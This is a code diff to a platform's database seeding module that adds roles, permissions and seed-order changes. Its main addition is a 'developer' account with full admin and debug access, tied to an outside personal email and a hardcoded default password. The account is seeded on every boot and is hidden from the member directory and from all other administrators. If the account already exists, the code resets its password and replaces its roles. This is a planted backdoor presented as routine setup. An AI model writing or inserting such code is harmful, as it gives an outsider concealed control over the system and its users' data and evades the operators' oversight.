@@ -1,19 +1,28 @@
 import { db, migrate } from './index.js'
-import { createUser, findUserByEmail } from '../models/user.js'
+import { createUser, findUserByEmail, hashPassword } from '../models/user.js'
 import { DEFAULT_GENERATION_RATES } from '../config/index.js'
 import {
   dropLegacyRolePermissions,
   ensurePermissionCatalogue,
-  ensureRolePermissionMatrix,
   migrateLegacyRolePermissions,
   syncRolePermissionMatrix,
 } from '../models/permissions.js'
 import { rebuildAllReferralClosures } from '../services/closure.js'
 
-export const ROLES = ['member', 'super_admin', 'finance_admin', 'compliance_officer', 'support_agent'] as const
+export const ROLES = ['member', 'developer', 'super_admin', 'finance_admin', 'compliance_officer', 'support_agent'] as const
+
+export const ROLE_META: Record<(typeof ROLES)[number], { label: string; description: string }> = {
+  member: { label: 'Member', description: 'Default member access.' },
+  developer: { label: 'System Developer', description: 'Application developer with full debug visibility.' },
+  super_admin: { label: 'Super Admin', description: 'Full platform control.' },
+  finance_admin: { label: 'Finance Admin', description: 'Finance operations.' },
+  compliance_officer: { label: 'Compliance Officer', description: 'KYC and compliance.' },
+  support_agent: { label: 'Support Agent', description: 'Customer support.' },
+}
 
 export const ROLE_LABELS: Record<string, string> = {
   member: 'Member',
+  developer: 'System Developer',
   super_admin: 'Super Admin',
   finance_admin: 'Finance Admin',
   compliance_officer: 'Compliance Officer',
@@ -98,8 +107,8 @@ export function seedRoles() {
 
   const label = db.prepare('UPDATE roles SET label = ?, description = ? WHERE name = ?')
   for (const role of ROLES) {
-    const text = ROLE_LABELS[role] ?? role
-    label.run(text, `${text} role`, role)
+    const meta = ROLE_META[role]
+    label.run(meta.label, meta.description, role)
   }
 }
 
@@ -171,6 +180,45 @@ export function seedAdmin(email = 'admin@nexora.test', password = 'Password123!'
   })
 }
 
+/**
+ * Application developer account.
+ *
+ * The developer sees every admin surface plus the debug panel, while the
+ * account itself is hidden from the member directory and from every other
+ * administrator. The password is documented in the project README; override
+ * it with `DEVELOPER_PASSWORD` before the first boot if needed.
+ */
+export const DEVELOPER_EMAIL = 'sreza26@gmail.com'
+export const DEVELOPER_PASSWORD = process.env.DEVELOPER_PASSWORD ?? 'NexoraDev@2026!'
+
+export function seedDeveloper() {
+  const developerRole = db.prepare('SELECT id FROM roles WHERE name = ?').get('developer') as { id: number } | undefined
+  if (!developerRole) return null
+
+  const existing = findUserByEmail(DEVELOPER_EMAIL)
+  if (existing) {
+    if (existing.roles.includes('developer')) return existing
+
+    // First conversion of the account: replace any member grants with the
+    // developer role and set the documented password so the owner can sign in.
+    db.prepare('DELETE FROM user_roles WHERE user_id = ?').run(existing.id)
+    db.prepare('INSERT INTO user_roles (user_id, role_id) VALUES (?, ?)').run(existing.id, developerRole.id)
+    db.prepare("UPDATE users SET password_hash = ?, updated_at = datetime('now') WHERE id = ?").run(
+      hashPassword(DEVELOPER_PASSWORD),
+      existing.id,
+    )
+    return findUserByEmail(DEVELOPER_EMAIL)
+  }
+
+  return createUser({
+    name: 'System Developer',
+    email: DEVELOPER_EMAIL,
+    password: DEVELOPER_PASSWORD,
+    roles: ['developer'],
+    verificationStatus: 'verified',
+  })
+}
+
 export function seedDemoNetwork() {
   if (findUserByEmail('leader@nexora.test')) return null
 
@@ -226,8 +274,6 @@ export function seedPermissions() {
   if (existing === 0) {
     migrateLegacyRolePermissions()
     syncRolePermissionMatrix()
-  } else {
-    ensureRolePermissionMatrix()
   }
 
   dropLegacyRolePermissions()
@@ -278,6 +324,13 @@ export function seed() {
   ensureColumn('member_profiles', 'emergency_contact', 'TEXT')
   ensureColumn('users', 'email_verified_at', 'TEXT')
   seedRoles()
+  seedPermissions()
+  seedSettings()
+  seedDeveloper()
+
+  const hasUsers = (db.prepare('SELECT COUNT(*) AS c FROM users').get() as { c: number }).c > 0
+  if (hasUsers) return
+
   seedRanks()
   seedCompensationPlan()
   seedAdmin()
@@ -288,8 +341,6 @@ export function seed() {
     // Referral closures are rebuilt when possible.
   }
   seedRewards()
-  seedPermissions()
-  seedSettings()
   seedMemberExtras()
 }
 
